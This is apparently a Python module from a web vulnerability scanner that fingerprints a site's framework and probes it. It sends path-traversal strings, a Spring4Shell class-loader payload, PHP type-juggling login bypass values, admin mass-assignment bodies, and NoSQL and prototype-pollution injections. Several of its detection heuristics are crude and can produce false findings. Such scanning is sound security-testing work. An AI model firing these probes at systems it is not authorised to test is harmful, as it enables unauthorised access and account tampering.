#!/usr/bin/env python3
"""
Framework-Specific Vulnerabilities Detection Module
====================================================
Based on 2025 techniques including:
- ASP.NET path traversal + view engine bypass
- Java deserialization indicators
- ORM injection (Prisma, Beego, etc.)
- Spring Boot actuator exposure
- Express.js prototype pollution
- Rails mass assignment
- PHP type juggling

References:
- ASP.NET Razor exploits
- Java gadget chains
- Modern ORM vulnerabilities
"""

import re
import json
import base64
import random
import string
from typing import List, Optional, Dict
from urllib.parse import urlparse, quote, urlencode

from .base import TechniqueScanner, Finding, ScanProgress, is_shutdown


class FrameworkVulns(TechniqueScanner):
    """Framework-specific vulnerability scanner"""

    TECHNIQUE_NAME = "framework_vulns"
    TECHNIQUE_CATEGORY = "framework_specific"

    # ASP.NET specific endpoints
    ASPNET_ENDPOINTS = [
        # Debug and error pages
        "/elmah.axd",
        "/trace.axd",
        "/Trace.axd",
        "/_framework/blazor.webassembly.js",
        # Web.config exposure
        "/web.config",
        "/Web.config",
        # ViewState endpoints
        "/__doPostBack",
        # MVC routing
        "/error",
        "/error/notfound",
    ]

    # Java/Spring endpoints
    JAVA_ENDPOINTS = [
        # Spring Boot Actuator
        "/actuator",
        "/actuator/health",
        "/actuator/info",
        "/actuator/env",
        "/actuator/configprops",
        "/actuator/mappings",
        "/actuator/beans",
        "/actuator/heapdump",
        "/actuator/threaddump",
        "/actuator/loggers",
        "/actuator/metrics",
        "/actuator/jolokia",
        "/actuator/gateway/routes",
        # Legacy actuator paths
        "/health",
        "/info",
        "/env",
        "/mappings",
        "/beans",
        "/dump",
        "/trace",
        "/logfile",
        # Swagger/OpenAPI
        "/swagger-ui.html",
        "/swagger-ui/",
        "/v2/api-docs",
        "/v3/api-docs",
        "/api-docs",
        # Druid
        "/druid/index.html",
        "/druid/sql.html",
    ]

    # PHP specific
    PHP_ENDPOINTS = [
        "/phpinfo.php",
        "/info.php",
        "/test.php",
        "/php_info.php",
        "/i.php",
        "/.env",
        "/config.php",
        "/wp-config.php",
        "/configuration.php",
        "/.git/config",
        "/.svn/entries",
        "/composer.json",
        "/vendor/autoload.php",
    ]

    # Node.js/Express specific
    NODE_ENDPOINTS = [
        "/package.json",
        "/node_modules/",
        "/.npmrc",
        "/npm-debug.log",
        "/yarn.lock",
        "/graphql",
        "/playground",
    ]

    # Ruby/Rails specific
    RAILS_ENDPOINTS = [
        "/rails/info/routes",
        "/rails/info/properties",
        "/rails/mailers",
        "/sidekiq",
        "/resque",
        "/Gemfile",
        "/Gemfile.lock",
        "/config/database.yml",
        "/config/secrets.yml",
    ]

    # Django/Python specific
    PYTHON_ENDPOINTS = [
        "/admin/",
        "/__debug__/",
        "/static/admin/",
        "/requirements.txt",
        "/settings.py",
        "/manage.py",
        "/.python-version",
        "/Pipfile",
        "/pyproject.toml",
    ]

    # ORM injection payloads
    ORM_PAYLOADS = [
        # Prisma type coercion
        {"where": {"id": {"equals": None}}},
        {"where": {"OR": [{"id": 1}, {"id": 2}]}},
        # Sequelize operator injection
        {"id": {"$ne": None}},
        {"id": {"$gt": 0}},
        # MongoDB-style
        {"$where": "1==1"},
        {"$gt": ""},
        # Beego filter expressions
        {"filter": "__proto__[admin]=true"},
    ]

    # Deserialization indicators
    DESER_INDICATORS = [
        # Java serialized object magic bytes (base64)
        "rO0AB",  # Base64 of Java serialized
        "H4sIAAAA",  # Base64 of gzipped data
        # .NET ViewState
        "__VIEWSTATE",
        "__EVENTVALIDATION",
        # PHP serialized
        "a:0:{}",
        'O:8:"stdClass"',
        # Python pickle
        "gASV",
        # Ruby Marshal
        "BAh",
    ]

    # Technology detection patterns
    TECH_PATTERNS = {
        "aspnet": [
            (r'ASP\.NET', 'header_or_body'),
            (r'__VIEWSTATE', 'body'),
            (r'\.aspx', 'url'),
            (r'X-AspNet-Version', 'header'),
            (r'X-Powered-By.*ASP', 'header'),
        ],
        "java": [
            (r'JSESSIONID', 'cookie'),
            (r'java\.lang', 'body'),
            (r'Servlet', 'header_or_body'),
            (r'Spring', 'header_or_body'),
            (r'X-Powered-By.*Servlet', 'header'),
        ],
        "php": [
            (r'PHPSESSID', 'cookie'),
            (r'X-Powered-By.*PHP', 'header'),
            (r'\.php', 'url'),
        ],
        "nodejs": [
            (r'Express', 'header'),
            (r'X-Powered-By.*Express', 'header'),
            (r'connect\.sid', 'cookie'),
        ],
        "rails": [
            (r'_session_id', 'cookie'),
            (r'X-Request-Id', 'header'),
            (r'X-Runtime', 'header'),
            (r'\.rb', 'body'),
        ],
        "django": [
            (r'csrfmiddlewaretoken', 'body'),
            (r'sessionid', 'cookie'),
            (r'django', 'body'),
        ],
    }

    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    def _detect_technology(self, domain: str) -> Dict:
        """Detect the technology stack used by the target"""
        url = f"https://{domain}/"
        resp = self.get(url, allow_redirects=True)

        if resp is None:
            return {"detected": [], "indicators": []}

        detected = []
        indicators = []

        headers_str = str(resp.headers).lower()
        cookies_str = str(resp.cookies).lower()
        body = resp.text.lower()
        url_str = str(resp.url).lower()

        for tech, patterns in self.TECH_PATTERNS.items():
            for pattern, location in patterns:
                if location == 'header' and re.search(pattern, headers_str, re.IGNORECASE):
                    detected.append(tech)
                    indicators.append(f"{tech}: {pattern} in headers")
                    break
                elif location == 'cookie' and re.search(pattern, cookies_str, re.IGNORECASE):
                    detected.append(tech)
                    indicators.append(f"{tech}: {pattern} in cookies")
                    break
                elif location == 'body' and re.search(pattern, body, re.IGNORECASE):
                    detected.append(tech)
                    indicators.append(f"{tech}: {pattern} in body")
                    break
                elif location == 'url' and re.search(pattern, url_str, re.IGNORECASE):
                    detected.append(tech)
                    indicators.append(f"{tech}: {pattern} in URL")
                    break
                elif location == 'header_or_body':
                    if re.search(pattern, headers_str + body, re.IGNORECASE):
                        detected.append(tech)
                        indicators.append(f"{tech}: {pattern}")
                        break

        # Additional header checks
        server = resp.headers.get('Server', '').lower()
        powered_by = resp.headers.get('X-Powered-By', '').lower()

        if 'apache' in server:
            indicators.append("Server: Apache")
        if 'nginx' in server:
            indicators.append("Server: Nginx")
        if 'iis' in server:
            detected.append('aspnet')
            indicators.append("Server: IIS")
        if 'tomcat' in server or 'jetty' in server:
            detected.append('java')
            indicators.append(f"Server: {server}")

        return {
            "detected": list(set(detected)),
            "indicators": indicators,
            "server": server,
            "powered_by": powered_by
        }

    def _scan_aspnet(self, domain: str) -> List[Dict]:
        """Scan for ASP.NET specific vulnerabilities"""
        findings = []

        for endpoint in self.ASPNET_ENDPOINTS:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            resp = self.get(url, allow_redirects=False)

            if resp and resp.status_code == 200:
                findings.append({
                    "type": "aspnet_exposure",
                    "endpoint": endpoint,
                    "status": resp.status_code,
                    "evidence": f"ASP.NET endpoint accessible: {endpoint}"
                })

        # Test ViewState tampering potential
        resp = self.get(f"https://{domain}/", allow_redirects=True)
        if resp and '__VIEWSTATE' in resp.text:
            viewstate_match = re.search(r'__VIEWSTATE.*?value="([^"]+)"', resp.text)
            if viewstate_match:
                viewstate = viewstate_match.group(1)
                # Check if ViewState is not encrypted (starts with /w)
                if viewstate.startswith('/w'):
                    findings.append({
                        "type": "viewstate_unencrypted",
                        "evidence": "ViewState appears unencrypted - potential deserialization target"
                    })

        # Test path traversal with .aspx
        traversal_payloads = [
            "/..%252f..%252f..%252fweb.config",
            "/....//....//web.config",
            "/.%2e/.%2e/web.config",
        ]

        for payload in traversal_payloads:
            if is_shutdown():
                break

            url = f"https://{domain}{payload}"
            resp = self.get(url, allow_redirects=False)

            if resp and resp.status_code == 200:
                if 'configuration' in resp.text.lower() or 'connectionstring' in resp.text.lower():
                    findings.append({
                        "type": "path_traversal",
                        "payload": payload,
                        "evidence": f"Path traversal to web.config successful"
                    })

        return findings

    def _scan_java_spring(self, domain: str) -> List[Dict]:
        """Scan for Java/Spring specific vulnerabilities"""
        findings = []

        for endpoint in self.JAVA_ENDPOINTS:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            resp = self.get(url, allow_redirects=False)

            if resp is None:
                continue

            if resp.status_code == 200:
                sensitive_actuators = ['env', 'configprops', 'heapdump', 'threaddump', 'mappings', 'beans', 'jolokia']
                is_sensitive = any(s in endpoint for s in sensitive_actuators)

                findings.append({
                    "type": "actuator_exposure" if 'actuator' in endpoint else "java_exposure",
                    "endpoint": endpoint,
                    "sensitive": is_sensitive,
                    "evidence": f"Java/Spring endpoint accessible: {endpoint}"
                })

                # Check for credentials in /actuator/env
                if 'env' in endpoint:
                    if any(s in resp.text.lower() for s in ['password', 'secret', 'key', 'token', 'credential']):
                        findings.append({
                            "type": "credential_exposure",
                            "endpoint": endpoint,
                            "evidence": "Sensitive data potentially exposed in /actuator/env"
                        })

        # Test for Spring4Shell indicators
        test_url = f"https://{domain}/"
        spring_payload = {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25%7Bc2%7Di",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp"
        }

        resp = self.post(test_url, data=spring_payload, allow_redirects=False)
        if resp and resp.status_code in [200, 400]:
            # Check if payload was processed
            if 'class' in resp.text.lower():
                findings.append({
                    "type": "spring4shell_indicator",
                    "evidence": "Spring application may be vulnerable to class loader manipulation"
                })

        return findings

    def _scan_php(self, domain: str) -> List[Dict]:
        """Scan for PHP specific vulnerabilities"""
        findings = []

        for endpoint in self.PHP_ENDPOINTS:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            resp = self.get(url, allow_redirects=False)

            if resp and resp.status_code == 200:
                sensitive = endpoint in ['/.env', '/wp-config.php', '/configuration.php', '/.git/config']
                findings.append({
                    "type": "php_exposure",
                    "endpoint": endpoint,
                    "sensitive": sensitive,
                    "evidence": f"PHP file/config accessible: {endpoint}"
                })

                # Check for phpinfo exposure
                if 'phpinfo' in endpoint and 'PHP Version' in resp.text:
                    version_match = re.search(r'PHP Version.*?(\d+\.\d+\.\d+)', resp.text)
                    if version_match:
                        findings.append({
                            "type": "phpinfo_exposure",
                            "version": version_match.group(1),
                            "evidence": f"PHPInfo exposed - Version: {version_match.group(1)}"
                        })

        # Test PHP type juggling
        type_juggle_endpoints = ["/api/login", "/login", "/api/auth"]
        for endpoint in type_juggle_endpoints:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"

            # Test boolean type juggling
            payloads = [
                {"password": True},
                {"password": 0},
                {"password": []},
                {"password": "0e123456"},  # Magic hash
            ]

            for payload in payloads:
                resp = self.post(url, json=payload, allow_redirects=False)
                if resp and resp.status_code == 200:
                    if 'success' in resp.text.lower() or 'welcome' in resp.text.lower():
                        findings.append({
                            "type": "type_juggling",
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "evidence": f"Type juggling may be possible: {payload}"
                        })

        return findings

    def _scan_nodejs(self, domain: str) -> List[Dict]:
        """Scan for Node.js specific vulnerabilities"""
        findings = []

        for endpoint in self.NODE_ENDPOINTS:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            resp = self.get(url, allow_redirects=False)

            if resp and resp.status_code == 200:
                findings.append({
                    "type": "nodejs_exposure",
                    "endpoint": endpoint,
                    "evidence": f"Node.js file accessible: {endpoint}"
                })

                # Check for dependencies in package.json
                if 'package.json' in endpoint:
                    try:
                        pkg = resp.json()
                        deps = list(pkg.get('dependencies', {}).keys())
                        findings.append({
                            "type": "dependencies_exposed",
                            "dependencies": deps[:10],
                            "evidence": f"Dependencies exposed: {deps[:5]}"
                        })
                    except:
                        pass

        # Test prototype pollution via query params
        pp_payloads = [
            "__proto__[admin]=1",
            "constructor[prototype][admin]=1",
            "__proto__.admin=1",
        ]

        for payload in pp_payloads:
            if is_shutdown():
                break

            url = f"https://{domain}/?{payload}"
            resp = self.get(url, allow_redirects=True)

            if resp and resp.status_code == 200:
                if 'admin' in resp.text.lower():
                    findings.append({
                        "type": "prototype_pollution_indicator",
                        "payload": payload,
                        "evidence": f"Prototype pollution may be possible via: {payload}"
                    })

        return findings

    def _scan_rails(self, domain: str) -> List[Dict]:
        """Scan for Rails specific vulnerabilities"""
        findings = []

        for endpoint in self.RAILS_ENDPOINTS:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            resp = self.get(url, allow_redirects=False)

            if resp and resp.status_code == 200:
                findings.append({
                    "type": "rails_exposure",
                    "endpoint": endpoint,
                    "evidence": f"Rails endpoint accessible: {endpoint}"
                })

        # Test mass assignment
        test_endpoints = ["/api/users", "/users", "/api/account"]
        mass_assign_payloads = [
            {"user": {"admin": True, "role": "admin"}},
            {"admin": True, "role": "admin"},
            {"user[admin]": True, "user[role]": "admin"},
        ]

        for endpoint in test_endpoints:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"

            for payload in mass_assign_payloads:
                resp = self.post(url, json=payload, allow_redirects=False)
                if resp and resp.status_code in [200, 201, 422]:
                    # Check if admin field was processed
                    if 'admin' in resp.text.lower():
                        findings.append({
                            "type": "mass_assignment_indicator",
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "evidence": "Mass assignment may be possible"
                        })

        return findings

    def _scan_orm_injection(self, domain: str) -> List[Dict]:
        """Scan for ORM injection vulnerabilities"""
        findings = []

        api_endpoints = [
            "/api/users",
            "/api/search",
            "/api/query",
            "/api/filter",
            "/graphql",
        ]

        for endpoint in api_endpoints:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"

            for payload in self.ORM_PAYLOADS:
                resp = self.post(url, json=payload, allow_redirects=False)

                if resp is None:
                    continue

                # Check for ORM-specific errors or unexpected success
                response_text = resp.text.lower()

                if resp.status_code == 500:
                    if any(err in response_text for err in ['prisma', 'sequelize', 'typeorm', 'sqlalchemy', 'activerecord']):
                        findings.append({
                            "type": "orm_error",
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "evidence": f"ORM error triggered - potential injection point"
                        })

                elif resp.status_code == 200:
                    if '$where' in str(payload) or '$ne' in str(payload):
                        findings.append({
                            "type": "orm_nosql_injection",
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "evidence": "NoSQL/ORM injection may be possible"
                        })

        return findings

    def scan(self, domain: str, progress: ScanProgress) -> List[Finding]:
        """Scan domain for framework-specific vulnerabilities"""
        findings = []
        self.log(f"Testing framework vulnerabilities on {domain}")

        # Detect technology
        self.log("Detecting technology stack")
        tech_info = self._detect_technology(domain)

        if tech_info["detected"]:
            self.log(f"Detected: {', '.join(tech_info['detected'])}", "success")

            finding = self.create_finding(
                domain=domain,
                severity="info",
                title=f"Technology Detected: {', '.join(tech_info['detected'])}",
                description=f"Identified technology stack",
                evidence=f"Indicators: {tech_info['indicators'][:5]}",
                reproduction_steps=[
                    f"Server: {tech_info['server']}",
                    f"X-Powered-By: {tech_info['powered_by']}",
                    f"Technologies: {tech_info['detected']}"
                ]
            )
            findings.append(finding)
            progress.add_finding(domain, finding)

        # Scan based on detected technology
        detected = tech_info["detected"]

        if 'aspnet' in detected or not detected:
            self.log("Scanning for ASP.NET vulnerabilities")
            aspnet_findings = self._scan_aspnet(domain)

            for af in aspnet_findings:
                severity = "critical" if af["type"] in ["path_traversal", "viewstate_unencrypted"] else "medium"
                finding = self.create_finding(
                    domain=domain,
                    severity=severity,
                    title=f"ASP.NET: {af['type'].replace('_', ' ').title()}",
                    description=f"ASP.NET vulnerability detected",
                    evidence=af["evidence"],
                    reproduction_steps=[
                        f"Type: {af['type']}",
                        f"Details: {af}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        if 'java' in detected or not detected:
            self.log("Scanning for Java/Spring vulnerabilities")
            java_findings = self._scan_java_spring(domain)

            for jf in java_findings:
                severity = "critical" if jf.get("sensitive") or jf["type"] == "credential_exposure" else "high"
                finding = self.create_finding(
                    domain=domain,
                    severity=severity,
                    title=f"Java/Spring: {jf['type'].replace('_', ' ').title()}",
                    description=f"Java/Spring vulnerability or exposure",
                    evidence=jf["evidence"],
                    reproduction_steps=[
                        f"Endpoint: {jf.get('endpoint', 'N/A')}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        if 'php' in detected or not detected:
            self.log("Scanning for PHP vulnerabilities")
            php_findings = self._scan_php(domain)

            for pf in php_findings:
                severity = "high" if pf.get("sensitive") or pf["type"] == "type_juggling" else "medium"
                finding = self.create_finding(
                    domain=domain,
                    severity=severity,
                    title=f"PHP: {pf['type'].replace('_', ' ').title()}",
                    description=f"PHP vulnerability or exposure",
                    evidence=pf["evidence"],
                    reproduction_steps=[
                        f"Details: {pf}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        if 'nodejs' in detected or not detected:
            self.log("Scanning for Node.js vulnerabilities")
            node_findings = self._scan_nodejs(domain)

            for nf in node_findings:
                severity = "high" if nf["type"] == "prototype_pollution_indicator" else "medium"
                finding = self.create_finding(
                    domain=domain,
                    severity=severity,
                    title=f"Node.js: {nf['type'].replace('_', ' ').title()}",
                    description=f"Node.js vulnerability or exposure",
                    evidence=nf["evidence"],
                    reproduction_steps=[
                        f"Details: {nf}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        if 'rails' in detected:
            self.log("Scanning for Rails vulnerabilities")
            rails_findings = self._scan_rails(domain)

            for rf in rails_findings:
                finding = self.create_finding(
                    domain=domain,
                    severity="medium",
                    title=f"Rails: {rf['type'].replace('_', ' ').title()}",
                    description=f"Rails vulnerability or exposure",
                    evidence=rf["evidence"],
                    reproduction_steps=[
                        f"Details: {rf}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        # Always scan for ORM injection
        if not is_shutdown():
            self.log("Scanning for ORM injection")
            orm_findings = self._scan_orm_injection(domain)

            for of in orm_findings:
                finding = self.create_finding(
                    domain=domain,
                    severity="high",
                    title=f"ORM: {of['type'].replace('_', ' ').title()}",
                    description=f"ORM injection vulnerability",
                    evidence=of["evidence"],
                    reproduction_steps=[
                        f"Endpoint: {of['endpoint']}",
                        f"Payload: {of['payload']}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        self.log(f"Completed: {len(findings)} framework issues found", "success" if findings else "info")
        return findings
